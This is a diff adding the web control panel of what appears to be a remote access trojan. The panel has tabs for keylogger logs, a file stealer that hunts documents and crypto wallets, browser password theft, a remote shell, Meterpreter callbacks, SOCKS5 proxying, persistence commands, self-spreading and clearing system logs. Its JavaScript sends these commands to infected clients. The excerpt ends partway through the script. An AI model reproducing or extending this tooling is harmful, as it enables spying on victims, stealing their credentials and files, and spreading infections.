+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="input-group mb-3">
+                                                                        <input type="password"
+                                                                               class="form-control"
+                                                                               name="password"
+                                                                               placeholder="Password" required>
+                                                                        <div class="input-group-append">
+                                                                            <div class="input-group-text">
+                                                                                <span class="fas fa-lock"></span>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </form>
+                                                        </div>
+                                                    </div>
+                                                 -->
+                                                        </div>
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-one-server" role="tabpanel" aria-labelledby="custom-tabs-one-server-tab">
+
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-one-others" role="tabpanel" aria-labelledby="custom-tabs-one-others-tab">
+                                                        <div class="row">
+                                                            <div class="col-lg-6">
+                                                                <form action="../issue/linux" class="form-horizontal" id="dropfiles" method="post" name="dropfiles">
+                                                                    <div class="card card-primary card-outline">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">
+                                                                                Drop File <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button>
+                                                                            </h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="input-group mb-3">
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text">File</span>
+                                                                                </div>
+                                                                                <input type="text" class="form-control" id="dropfile" required placeholder="www.example.com/file.png" />
+                                                                            </div>
+                                                                            <div class="input-group">
+                                                                                <select class="custom-select" id="dropZone">
+                                                                                    <option disabled selected value="">
+                                                                                        Select Drop Area
+                                                                                    </option>
+                                                                                    <option data-rn="0" value="0">
+                                                                                        Root
+                                                                                    </option>
+                                                                                    <option data-rn="1" value="1">
+                                                                                        Home
+                                                                                    </option>
+                                                                                    <option data-rn="2" value="2">
+                                                                                        Temp
+                                                                                    </option>
+                                                                                    <option data-rn="3" value="3">
+                                                                                        /var/www
+                                                                                    </option>
+                                                                                    <option data-rn="4" value="4">
+                                                                                        /usr/local
+                                                                                    </option>
+                                                                                    <option data-rn="" value="">
+                                                                                        CUSTOM
+                                                                                    </option>
+                                                                                </select>
+                                                                                <input type="text" class="form-control" placeholder="nudes.jpg" id="droplocation" name="droplocation" />
+                                                                            </div>
+                                                                            <div class="form-group">
+                                                                                <div class="input-group date" id="timeout" data-target-input="nearest">
+                                                                                    <div class="input-group-prepend">
+                                                                                        <span class="input-group-text">File Date</span>
+                                                                                    </div>
+                                                                                    <input type="text" class="form-control" id="creationdate" />
+                                                                                    <div class="input-group-append" data-target="#creationdate" data-toggle="creationdate">
+                                                                                        <div class="input-group-text"><i class="fa fa-calendar"></i></div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="card-footer">
+                                                                            <center>Select Custom for custom path</center>
+                                                                            <center><code>For additional help please refer to the manual.</code></center>
+                                                                        </div>
+                                                                    </div>
+                                                                </form>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- /.card -->
+                                        </div>
+                                    </div>
+                                    <div class="tab-pane fade" id="vert-tabs-Keylogger" role="tabpanel" aria-labelledby="vert-tabs-Keylogger-tab">
+                                        <div class="card card-primary card-tabs">
+                                            <div class="card-header p-0 pt-1">
+                                                <ul class="nav nav-tabs" id="custom-tabs-three-tab" role="tablist">
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link active"
+                                                                id="custom-tabs-three-keylogs-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-three-keylogs"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-three-keylogs"
+                                                                aria-selected="true"
+                                                        >
+                                                            Saved Logs
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link"
+                                                                id="custom-tabs-three-settings-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-three-settings"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-three-settings"
+                                                                aria-selected="false"
+                                                        >
+                                                            Settings
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="tab-content" id="custom-tabs-three-tabContent">
+                                                    <div class="tab-pane fade show active" id="custom-tabs-three-keylogs" role="tabpanel" aria-labelledby="custom-tabs-one-keylogs-tab">
+                                                        <table class="table table-striped table-borderless dark-mode" id="keylogsTable">
+                                                            <thead>
+                                                            <tr>
+                                                                <th>Date & Time</th>
+                                                                <th>Size</th>
+                                                                <th>Options</th>
+                                                            </tr>
+                                                            </thead>
+                                                            <tbody>
+                                                            {{ range .KeyloggerTables}}
+
+                                                            <tr>
+                                                                <td>{{.Date}}</td>
+                                                                <td>{{.Size}}</td>
+                                                                <td>
+                                                                    <center>
+                                                                        <a class="btn btn-success btn-flat" name="{{.FileLink}}" onclick="readFile(this)" data-target="#modal-view" data-toggle="modal">
+                                                                            <i class="fab fa-lg fa-readme"></i>
+                                                                        </a>
+                                                                        <a class="btn btn-danger btn-flat" name="{{.FileLink}}" onclick="deleteLFile(this)" filetype="log" href="#"><i class="fas fa-lg fa-trash-alt"></i></a>
+                                                                    </center>
+                                                                </td>
+                                                            </tr>
+
+                                                            {{ end}}
+                                                            </tbody>
+                                                        </table>
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-three-settings" role="tabpanel" aria-labelledby="custom-tabs-three-settings-tab">
+                                                        <div class="card card-primary card-outline">
+                                                            <form action="../issue/linux" class="form-horizontal" id="keylogger" method="post" name="keylogger">
+                                                                <div class="card-header">
+                                                                    <h5 class="m-0">
+                                                                        <div class="float-left"><input type="checkbox" name="keylogcheck" id="keylogcheck" data-bootstrap-switch /></div>
+                                                                        <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"> </i></button>
+                                                                    </h5>
+                                                                </div>
+                                                                <div class="card-body"></div>
+                                                            </form>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- /.card -->
+                                            <div class="card-footer">&nbsp;Status: <code>{{.KeyloggerState}}</code></div>
+                                        </div>
+                                    </div>
+                                    <div class="tab-pane fade" id="vert-tabs-FileStealer" role="tabpanel" aria-labelledby="vert-tabs-FileStealer-tab">
+                                        <div class="card card-primary card-tabs">
+                                            <div class="card-header p-0 pt-1">
+                                                <ul class="nav nav-tabs" id="custom-tabs-files-tab" role="tablist">
+                                                    <li class="nav-item">
+                                                        <a
+                                                                class="nav-link active"
+                                                                id="custom-tabs-one-files-tab"
+                                                                data-toggle="pill"
+                                                                href="#custom-tabs-one-files"
+                                                                role="tab"
+                                                                aria-controls="custom-tabs-one-files"
+                                                                aria-selected="true"
+                                                        >
+                                                            Files
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-one-hunter-tab" data-toggle="pill" href="#custom-tabs-one-hunter" role="tab" aria-controls="custom-tabs-one-hunter" aria-selected="false">
+                                                            File Hunter
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="tab-content" id="custom-tabs-files-tabContent">
+                                                    <div class="tab-pane fade show active" id="custom-tabs-one-files" role="tabpanel" aria-labelledby="custom-tabs-one-files-tab">
+                                                        <table class="table table-striped table-borderless dark-mode" id="fileTable">
+                                                            <thead>
+                                                            <tr>
+                                                                <th>File Name</th>
+                                                                <th>Date Stolen</th>
+                                                                <th>Options</th>
+                                                            </tr>
+                                                            </thead>
+                                                            <tbody>
+                                                            {{ range .StolenTables}}
+
+                                                            <tr>
+                                                                <td>{{.FileName}}</td>
+                                                                <td>{{.DateStolen}}</td>
+
+                                                                <td>
+                                                                    <center>
+                                                                        <a class="btn btn-info btn-flat" name="{{.FileUID}}" onclick="downloadFile(this)" href="#"><i class="fas fa-lg fa-download"></i></a>
+                                                                        <a class="btn btn-danger btn-flat" name="{{.FileUID}}" filetype="stealer" onclick="deleteFile(this)" href="#"><i class="fas fa-lg fa-trash-alt"></i></a>
+                                                                    </center>
+                                                                </td>
+                                                            </tr>
+
+                                                            {{ end}}
+                                                            </tbody>
+                                                        </table>
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-one-hunter" role="tabpanel" aria-labelledby="custom-tabs-one-hunter-tab">
+                                                        <div class="row">
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="basichunt" method="post" name="basichunt">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">Basic Hunter</h5>
+                                                                        </div>
+                                                                        <div class="card-body">
+                                                                            <div class="input-group mb-3">
+                                                                                <div class="input-group-prepend">
+                                                                                    <span class="input-group-text">Find</span>
+                                                                                </div>
+                                                                                <select class="custom-select" id="huntfor" name="huntfor">
+                                                                                    <option disabled selected value="">
+                                                                                        Select what to hunt for...
+                                                                                    </option>
+                                                                                    <option data-rn="0" value="0">
+                                                                                        Pictures
+                                                                                    </option>
+                                                                                    <option data-rn="1" value="1">
+                                                                                        Videos
+                                                                                    </option>
+                                                                                    <option data-rn="2" value="2">
+                                                                                        Audio
+                                                                                    </option>
+                                                                                    <option data-rn="3" value="3">
+                                                                                        Documents
+                                                                                    </option>
+                                                                                    <option data-rn="4" value="4">
+                                                                                        Archives
+                                                                                    </option>
+                                                                                    <option data-rn="5" value="5">
+                                                                                        Crypto Wallets
+                                                                                    </option>
+                                                                                    <option data-rn="6" value="6">
+                                                                                        "Interesting" Files
+                                                                                    </option>
+                                                                                </select>
+                                                                            </div>
+                                                                            <div class="custom-control-inline custom-switch">
+                                                                                <input type="checkbox" class="custom-control-input float-right" id="alldrives" />
+                                                                                <label class="custom-control-label float-right" name="alldrives" for="alldrives">Scan all Drives? <code>Default C:\</code></label>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="card-footer">
+                                                                            <button type="submit" class="btn btn-default btn-block"><i class="fab fa-searchengin"></i> Go Hunting!</button>
+                                                                        </div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+                                                            <div class="col-lg-6">
+                                                                <div class="card card-primary card-outline">
+                                                                    <form action="../issue/linux" class="form-horizontal" id="huntcustom" method="post" name="hunt">
+                                                                        <div class="card-header">
+                                                                            <h5 class="m-0">Advanced Hunter</h5>
+                                                                        </div>
+                                                                        <div class="card-body"></div>
+                                                                        <div class="card-footer">
+                                                                            <button type="submit" class="btn btn-default btn-block"><i class="fab fa-searchengin"></i> Go Hunting!</button>
+                                                                        </div>
+                                                                    </form>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card-footer">
+                                                &nbsp;Status: <code>{{.FileHunterState}}</code>
+                                                <button class="btn btn-info bg-gradient-primary float-right" data-target="#modal-default" data-toggle="modal" type="button">Help <i class="fa fa-question"></i></button>
+                                            </div>
+                                            <!-- /.card -->
+                                        </div>
+                                    </div>
+                                    <div class="tab-pane fade" id="vert-tabs-Recovery" role="tabpanel" aria-labelledby="vert-tabs-Recovery-tab">
+                                        <table class="table table-striped table-borderless dark-mode" id="browserTable">
+                                            <thead>
+                                            <tr>
+                                                <th>File</th>
+                                                <th>Date Received</th>
+                                                <th>Size</th>
+                                                <th>Options</th>
+                                            </tr>
+                                            </thead>
+                                            <tbody>
+                                            {{ range .BrowserTables}}
+
+                                            <tr>
+                                                <td>{{.BrowserIcon}} {{.File}}</td>
+                                                <td>{{.DateReceived}}</td>
+                                                <th>{{.Size}}</th>
+                                                <td>
+                                                    <center>
+                                                        <a class="btn btn-info btn-flat" name="{{.FileLink}}" data-target="#modal-view" data-toggle="modal" onclick="viewFile(this)"><i class="fab fa-lg fa-readme"></i></a>
+                                                        <a class="btn btn-info btn-flat" href="{{.FileLink}}" name="{{.FileLink}}" ><i class="fas fa-lg fa-download"></i></a>
+                                                        <a class="btn btn-danger btn-flat" name="{{.FileUID}}" onclick="deleteSFile(this)" href="#"><i class="fas fa-lg fa-trash-alt"></i></a>
+                                                    </center>
+                                                </td>
+                                            </tr>
+
+                                            {{ end}}
+                                            </tbody>
+                                        </table>
+                                        <div class="card-footer">&nbsp;<a class="btn btn-primary icon-btnS float-right" name="0xPASS" onclick="issuecommand(this)">Get Passwords</a></div>
+                                    </div>
+
+                                    <div class="tab-pane fade" id="vert-tabs-remote" role="tabpanel" aria-labelledby="vert-tabs-remote-tab">
+                                        <div class="card card-primary card-tabs">
+                                            <div class="card-header p-0 pt-1">
+                                                <ul class="nav nav-tabs" id="custom-tabs-remote-tab" role="tablist">
+                                                    <!--   <li class="nav-item">
+                                                 <a class="nav-link active" id="custom-tabs-two-client-tab" data-toggle="pill" href="#custom-tabs-two-client" role="tab" aria-controls="custom-tabs-two-client" aria-selected="false"> Controls</a>
+                                               </li>  -->
+                                                    <li class="nav-item">
+                                                        <a class="nav-link active" id="custom-tabs-two-shell-tab" data-toggle="pill" href="#custom-tabs-two-shell" role="tab" aria-controls="custom-tabs-two-shell" aria-selected="true">
+                                                            Remote Shell
+                                                        </a>
+                                                    </li>
+                                                    <!--     <li class="nav-item">
+                                                   <a class="nav-link" id="custom-tabs-two-profile-tab" data-toggle="pill" href="#custom-tabs-two-profile" role="tab" aria-controls="custom-tabs-two-profile" aria-selected="false"> Installed</a>
+                                                 </li> -->
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-two-file-tab" data-toggle="pill" href="#custom-tabs-two-file" role="tab" aria-controls="custom-tabs-two-file" aria-selected="false">
+                                                            File Management
+                                                        </a>
+                                                    </li>
+                                                    <li class="nav-item">
+                                                        <a class="nav-link" id="custom-tabs-two-controls-tab" data-toggle="pill" href="#custom-tabs-two-controls" role="tab" aria-controls="custom-tabs-two-controls" aria-selected="false">
+                                                            Remote Accesses
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="tab-content" id="custom-tabs-remote-tabContent">
+                                                    <div class="tab-pane fade show active" id="custom-tabs-two-shell" role="tabpanel" aria-labelledby="custom-tabs-two-shell-tab">
+                                                        <div class="card card-primary card-outline">
+
+                                                            <div class="card-header">
+                                                                <h5 class="m-0"><i class="fas fa-terminal"></i> Remote Shell
+
+                                                                </h5>
+                                                            </div>
+                                                            <div class="card-body">
+                                                                <center><code>To Connect type 'CONNECT' to Disconnect type 'DISCONNECT'</code></center>
+                                                                <div class="form-group">
+                                            <textarea class="form-control" rows="6" name="ShellOutput"
+                                                      id="ShellOutput" readonly></textarea>
+                                                                </div>
+                                                                <p>Command </p>
+                                                                <div class="input-group input-group-sm">
+                                                                    <input type="text" id="cmd" class="form-control" value="whoami">
+                                                                    <span class="input-group-append">
+                                     <button type="button" class="btn btn-info btn-flat">Send</button>
+                                            </span>
+                                                                </div>
+                                                            </div>
+
+
+                                                        </div>
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-two-file" role="tabpanel" aria-labelledby="custom-tabs-two-file-tab">
+
+                                                    </div>
+                                                    <div class="tab-pane fade" id="custom-tabs-two-controls" role="tabpanel" aria-labelledby="custom-tabs-two-controls-tab">
+                                                            <div class="card card-primary card-outline">
+                                                                <form action="../issue/linux" class="form-horizontal" id="Meterpreter" method="post" name="Meterpreter">
+                                                                    <div class="card-header">
+                                                                        <h5 class="m-0">
+                                                                            Meterpreter
+                                                                            <button class="btn btn-primary icon-btn float-right" type="submit"><i class="fa fa-fw fa-lg fa-cloud-upload-alt"></i></button>
+                                                                        </h5>
+                                                                    </div>
+                                                                    <div class="card-body">
+                                                                        <div class="input-group">
+                                                                            <div class="input-group-prepend">
+                                                                                <span class="input-group-text"><i class="fab fa-megaport"></i></span>
+                                                                            </div>
+                                                                            <select class="custom-select" id="conType">
+                                                                                <option disabled selected value="">
+                                                                                    Method
+                                                                                </option>
+                                                                                <option data-rn="http" value="http">
+                                                                                    HTTP
+                                                                                </option>
+                                                                                <option data-rn="https" value="https">
+                                                                                    HTTPS
+                                                                                </option>
+                                                                                <option data-rn="tcp" value="tcp">
+                                                                                    TCP
+                                                                                </option>
+                                                                            </select>
+                                                                            <div class="input-group-prepend">
+                                                                                <span class="input-group-text"><i class="fas fa-laptop"></i></span>
+                                                                            </div>
+                                                                            <input type="text" class="form-control" id="ip" required placeholder="127.0.0.1:4444" />
+                                                                        </div>
+                                                                    </div>
+                                                                </form>
+                                                            </div>
+                                                        </div>
+                                                </div>
+                                            </div>
+                                            <!-- /.card -->
+                                        </div>
+
+
+                                    </div>
+                                    <div class="tab-pane fade" id="vert-tabs-tasks" role="tabpanel" aria-labelledby="vert-tabs-tasks-tab">
+                                        <div class="card card-primary card-outline">
+                                            <div class="card-header">
+                                                <center><h5 class="m-0">Client Tasks</h5></center>
+                                            </div>
+                                            <div class="card-body">
+                                                <table class="table table-striped table-borderless dark-mode" id="taskTable">
+                                                    <thead>
+                                                    <tr>
+                                                        <th>Task Name</th>
+                                                        <th>Comments</th>
+                                                        <th>Timeout</th>
+                                                        <th>Options</th>
+                                                    </tr>
+                                                    </thead>
+                                                    <tbody>
+                                                    <tr>
+                                                        <td></td>
+                                                        <td></td>
+                                                        <td></td>
+                                                        <td>
+                                                            <center>
+                                                                <a class="btn btn-primary btn-flat" name="" onclick="deleteTask(this)" href="#"><i class="fas fa-lg fa-trash-alt"></i></a>
+                                                            </center>
+                                                        </td>
+                                                    </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="tab-pane fade" id="vert-tabs-settings" role="tabpanel" aria-labelledby="vert-tabs-settings-tab">
+                                        <div class="card card-primary card-outline">
+                                            <div class="card-header">
+                                                <center><h5 class="m-0">Client Controls</h5></center>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="row">
+                                                    <div class="col-lg-6">
+                                                        <div class="card card-primary card-outline">
+                                                            <div class="card-header">
+                                                                <center>Controls</center>
+                                                            </div>
+                                                            <div class="card-body">
+                                                                <div class="card-body row">
+                                                                    <div class="col-md-6">
+                                                                        <button type="button" class="btn btn-outline-warning btn-block" name="0xS" data-rn="Shutdown" onclick="issuecommand(this)">
+                                                                            <i class="fas fa-power-off"></i> Shutdown
+                                                                        </button>
+                                                                        <button type="button" class="btn btn-outline-warning btn-block" name="0xr" data-rn="Restart" onclick="issuecommand(this)">
+                                                                            <i class="fas fa-redo-alt"></i> Restart
+                                                                        </button>
+                                                                    </div>
+                                                                    <div class="col-md-6">
+                                                                        <button type="button" class="btn btn-outline-info btn-block" name="0xREFRESH" data-rn="Refresh" onclick="issuecommand(this)">
+                                                                            <i class="fa fa-sync-alt"></i>
+                                                                        </button>
+                                                                        <button type="button" class="btn btn-outline-success btn-block" name="0xSPREAD" data-rn="Spread" onclick="issuecommand(this)">
+                                                                            <i class="fas fa-viruses"></i>
+                                                                        </button>
+                                                                    </div>
+                                                                </div>
+                                                                <button type="button" class="btn btn-outline-success btn-block" name="0xCSLOGS" data-rn="Clear System Logs" onclick="issuecommand(this)">
+                                                                    <i class="fas fa-folder-minus"></i> Clear System Logs
+                                                                </button>
+                                                                <button type="button" class="btn btn-outline-danger btn-block" name="0xKC" data-rn="Kill Client" onclick="issuecommand(this)">
+                                                                    <i class="fas fa-skull-crossbones"></i> Kill Client
+                                                                </button>
+                                                                <button type="button" class="btn btn-outline-danger btn-block" name="0xUNC" data-rn="Uninstall Client" onclick="issuecommand(this)">
+                                                                    <i class="fas fa-user-slash"></i> Uninstall Client
+                                                                </button>
+                                                                <button type="button" class="btn btn-outline-info btn-block" name="0xREFRESH" data-rn="Refresh" onclick="issuecommand(this)">
+                                                                    <i class="fa fa-sync-alt"></i> Refresh Info
+                                                                </button>
+                                                                <button type="button" class="btn btn-outline-success btn-block" name="0xSPREAD" data-rn="Spread" onclick="issuecommand(this)">
+                                                                    <i class="fas fa-viruses"></i> Attempt Spread
+                                                                </button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-lg-6">
+                                                        <div class="card card-primary card-outline">
+                                                            <div class="card-header">
+                                                                <center>Variables</center>
+                                                            </div>
+                                                            <div class="card-body">
+                                                                <div class="input-group mb-3">
+                                                                    <div class="input-group-prepend">
+                                                                        <span class="input-group-text"><i class="fas fa-code-branch"></i></span>
+                                                                    </div>
+                                                                    <input type="text" class="form-control" value="{{.ClientVersion}}" readonly />
+                                                                </div>
+                                                                <div class="input-group mb-3">
+                                                                    <div class="input-group-prepend">
+                                                                        <span class="input-group-text"><i class="fas fa-id-badge"></i></span>
+                                                                    </div>
+                                                                    <input type="text" class="form-control" value="" readonly />
+                                                                </div>
+                                                                <div class="input-group mb-3">
+                                                                    <div class="input-group-prepend">
+                                                                        <span class="input-group-text"><i class="far fa-eye"></i></span>
+                                                                        <!-- Install Name -->
+                                                                    </div>
+                                                                    <input type="text" class="form-control" value="" readonly />
+                                                                    <!-- First Seen -->
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- /.card -->
+            </div>
+        </div>
+
+        <!-- /.content -->
+    </div>
+    <!-- /.content-wrapper -->
+
+    <!-- Main Footer -->
+    <footer class="main-footer">
+        <!-- To the right -->
+        <div class="float-right d-none d-sm-inline">
+            https://github.com/SaturnsVoid
+        </div>
+        <!-- Default to the left -->
+        <strong><i>"I'm very much a creature of habit."</i> </strong> - Eminem
+    </footer>
+</div>
+<!-- ./wrapper -->
+<div class="modal fade" id="modal-view">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title">View File</h4>
+                <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span></button>
+            </div>
+            <div class="modal-body">
+                <textarea class="form-control" rows="25" style="overflow: scroll;" id="viewLog" disabled></textarea>
+            </div>
+            <div class="modal-footer justify-content-between">
+                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
+            </div>
+        </div>
+        <!-- /.modal-content -->
+    </div>
+    <!-- /.modal-dialog -->
+</div>
+<div class="modal fade" id="modal-remotedesktop">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title">Instructions</h4>
+                <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span></button>
+            </div>
+            <div class="modal-body"></div>
+            <div class="modal-footer justify-content-between">
+                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
+            </div>
+        </div>
+        <!-- /.modal-content -->
+    </div>
+    <!-- /.modal-dialog -->
+</div>
+<!-- REQUIRED SCRIPTS -->
+
+<script src="../static/js/jquery.js"></script>
+<!-- Bootstrap 4 -->
+<script src="../static/js/bootstrap.bundle.min.js"></script>
+<!-- AdminLTE App -->
+<script src="../static/js/adminlte.min.js"></script>
+<script src="../static/js/jquery.dataTables.min.js"></script>
+<script src="../static/js/dataTables.bootstrap4.min.js"></script>
+<script src="../static/js/dataTables.buttons.min.js"></script>
+<script src="../static/js/buttons.bootstrap4.min.js"></script>
+<script src="../static/js/bootstrap-switch.js"></script>
+<script src="../static/js/pdfmake.min.js"></script>
+<script src="../static/js/buttons.html5.min.js"></script>
+<script src="../static/js/dataTables.select.min.js"></script>
+<script src="../static/js/sweetalert2.all.js"></script>
+
+<script src="../static/js/moment.min.js"></script>
+<script src="../static/js/toastr.min.js"></script>
+<script src="../static/js/jquery.inputmask.min.js"></script>
+<script src="../static/codemirror/codemirror.js"></script>
+<script src="../static/codemirror/addon/selection/active-line.js"></script>
+<script src="../static/codemirror/addon/edit/matchbrackets.js"></script>
+<script src="../static/codemirror/mode/javascript/javascript.js"></script>
+<script src="../static/codemirror/mode/powershell/powershell.js"></script>
+<script src="../static/codemirror/mode/vbscript/vbscript.js"></script>
+<script src="../static/js/bootstrap-datetimepicker.js"></script>
+
+<script>
+    $("#creationdate").datetimepicker({
+        icons: {
+            time: "far fa-clock",
+        },
+    });
+
+    $("input[data-bootstrap-switch]").each(function () {
+        $(this).bootstrapSwitch("state", $(this).prop("checked"));
+    });
+
+    var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
+        mode: "powershell",
+        lineNumbers: true,
+        styleActiveLine: true,
+        matchBrackets: true,
+        theme: "ambiance",
+    });
+
+    function selectMode() {
+        var mode = input.options[input.selectedIndex].textContent;
+        editor.setOption("mode", mode);
+    }
+
+    function resetA() {
+        document.getElementById("adminNotes").reset();
+    }
+    //
+    jQuery(function () {
+        jQuery("#hidden1").hide();
+        jQuery("#hidden2").hide();
+    });
+
+    function downloadnrunPE() {
+        var runpehost = document.getElementById("runpe");
+
+        if (runpehost.checked === true) {
+            jQuery("#hidden2").hide();
+        } else {
+            $("#hidden2").show();
+        }
+    }
+
+    function downloadnrunSta() {
+        var startupmeth = document.getElementById("startup");
+
+        if (startupmeth.checked == true) {
+            jQuery("#hidden1").hide();
+        } else {
+            $("#hidden1").show();
+        }
+    }
+
+    function eStopCMD() {
+        var table = $("#commandLogTable").DataTable();
+        var data = table.rows({ selected: true }).data();
+
+        //alert(data[0][0])
+        $.ajax({
+            type: "POST",
+            url: "../delete/command",
+            data: "id=" + data[0][0],
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Stopped!", "The command was stopped!", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    }
+
+    function viewFile(file) {
+        var url = file.name;
+        $.ajax({
+            url: url,
+            dataType: "text",
+            success: function (data) {
+                $("#viewLog").text(data);
+            },
+        });
+    }
+
+    function issuecommand(CMD) {
+        var cmd = CMD.name;
+        var cmdReal = CMD.getAttribute("data-rn");
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=" + cmd + "&real=" + cmdReal + "&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    }
+
+    $("#Meterpreter").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var method = $("#conType").val();
+        var ip = $("#ip").val();
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xMETER" + "&real=Meterpreter" + "&para=" + method + "|" + ip + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#msiinstall").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var file = $("#msiFile").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xMSI" + "&real=MSI Install" + "&para=" + file + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#socks5").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var ip = $("#ipv4").val();
+        var port = $("#port").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xSOCKS" + "&real=Socks5" + "&para=" + ip + "|" + port + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#issuePersisCmd").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var message = $("#command").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xPRCMD" + "&real=Persist. CMD" + "&para=" + message + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#issueMsgbox").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var module = $("#module").val();
+        var title = $("#title").val();
+        var message = $("#message").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xMSG" + "&real=MessageBox" + "&para=" + module + "|" + title + "|" + message + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
